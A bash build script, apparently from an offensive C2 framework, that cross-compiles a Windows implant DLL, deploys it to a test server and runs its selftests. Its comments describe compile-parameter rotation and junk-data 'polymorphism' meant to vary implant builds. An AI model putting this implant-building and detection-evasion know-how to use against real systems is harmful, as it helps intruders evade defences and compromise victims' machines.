#!/usr/bin/env bash
# Build the implant-win DLL on the dev host and verify it on the remote Windows
# server — the closed-loop "build locally, verify on Windows" pipeline.
#
# Why build on the dev host (not on Windows): the macOS host has brew's mingw
# (`x86_64-w64-mingw32-gcc`) + a nightly toolchain with the `x86_64-pc-windows-gnu`
# target and `rust-src`, so it cross-compiles the no_std PIC implant directly.
# The Windows server only needs to RUN the result (its toolchain is msvc-only,
# no git/python/mingw), so we SCP the fresh DLL there and drive the 8 selftest
# exports via rundll32 (scripts/remote_tests.py).
#
# Polymorphism L1 (compile-parameter rotation) — template build side ONLY.
# generate-implant stays "precompiled template + generate-time patch" and must
# not grow a cargo build.
#
#   NYX_BUILD_SEED  optional u64 (decimal or hex, optional 0x prefix).
#   Unset           this script is byte-identical to the historical default
#                   (crates/implant-win/Cargo.toml [profile.release]:
#                   opt-level="z", codegen-units=1, lto=true). No extra env.
#   Set             eval scripts/poly_seed.sh →
#                   CARGO_PROFILE_RELEASE_OPT_LEVEL ∈ {3,s,z}
#                   CARGO_PROFILE_RELEASE_CODEGEN_UNITS ∈ {16,1}
#                   NEVER sets CARGO_PROFILE_RELEASE_LTO (especially not fat).
#                   Fat LTO swallowed .nyx_cfg patches (commit b94a158) and
#                   produced dead implants that C2'd to 127.0.0.1.
#   Gate            every new param combo MUST pass nyx_selftest_cfgstage
#                   before it is a supported template. Do not add a CI matrix
#                   of all combos here; mapping coverage lives in
#                   crates/config/src/poly.rs tests.
#
# L3 (non-executable .rdata junk) is emitted by implant-core/build.rs when
# the same NYX_BUILD_SEED is set; unset omits the blob so default templates
# stay stable.
#
# Usage:   bash scripts/win_build.sh
# Exit:    0 if the build succeeded AND all 8 selftests hit their expected codes.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

if [[ ${NYX_BUILD_SEED+x} ]]; then
    echo "==> [poly L1] NYX_BUILD_SEED compile-parameter rotation"
    eval "$(bash "$ROOT/scripts/poly_seed.sh" "$NYX_BUILD_SEED")"
    echo "    CARGO_PROFILE_RELEASE_OPT_LEVEL=${CARGO_PROFILE_RELEASE_OPT_LEVEL}"
    echo "    CARGO_PROFILE_RELEASE_CODEGEN_UNITS=${CARGO_PROFILE_RELEASE_CODEGEN_UNITS}"
    echo "    LTO untouched (never fat; nyx_selftest_cfgstage is the gate)"
fi

DLL="crates/implant-win/target/x86_64-pc-windows-gnu/release/nyx_implant_win.dll"

echo "==> [1/2] cross-building implant-win (nightly + build-std -> x86_64-pc-windows-gnu)"
cargo +nightly build -Z build-std=core,alloc,panic_abort \
    --manifest-path crates/implant-win/Cargo.toml \
    --target x86_64-pc-windows-gnu --release
[[ -f "$DLL" ]] || { echo "FAIL: build did not produce $DLL"; exit 1; }
echo "    fresh DLL: $(stat -f '%z bytes, built %Sm' "$DLL")"

echo "==> [2/2] deploying to the Windows server + running selftests"
exec python3 scripts/remote_tests.py
